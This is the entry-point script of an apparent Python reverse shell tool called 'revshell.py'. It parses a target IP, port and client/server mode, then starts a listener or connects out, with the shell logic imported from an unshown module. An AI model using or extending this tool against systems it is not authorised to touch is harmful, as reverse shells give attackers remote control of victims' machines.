#!/usr/bin/python3
import argparse
from multi.nodes import *
from pathlib import Path

parser = argparse.ArgumentParser(
    prog="revshell.py",
    description="RevShell: Python3 TCP reverse shell utility",
)

parser.add_argument("target", type=str, nargs="?", help="target ip address")
parser.add_argument("-v", "--verbose", action="store_true", help="verbose output")
parser.add_argument("-m", "--mode", type=str, help="operation mode [client|server]")
parser.add_argument("-p", "--port", type=int, help="port to use as TCP socket")

args = parser.parse_args()

target: str = args.target
verbose: bool = args.verbose
mode: str = args.mode
port: int = args.port

if __name__ == "__main__":
    if (target is None) and (mode is None):
        msg = "one or both of the following arguments are required: "
        parser.error(msg + "target, -m/--mode")
        exit(1)

    if target is None:
        if (mode is None) or (mode.lower() == "client"):
            throw("Value for [target] can't be null if running in client mode")
    else:
        if not ipv4_parse(target):
            throw("Value for [target] is not a valid IPv4 address")

    if verbose:
        if target is None:
            status("target => 0.0.0.0")
        else:
            status(f"target => {target}")

    if mode is not None:
        if mode.lower() not in ["client", "server"]:
            throw("Expected <mode> to be 'client' or 'server'")
    else:
        mode = "client"

    if verbose:
        status(f"mode => {mode.lower()}")

    if mode == "server":
        if target is not None:
            if port is not None:
                handler = Server(target, port)
            else:
                handler = Server(target)
        else:
            if port is not None:
                handler = Server(port=port)
            else:
                handler = Server()

        handler.listen()
    else:
        if port is not None:
            handler = Client(target, port)
        else:
            handler = Client(target)

        handler.connect()
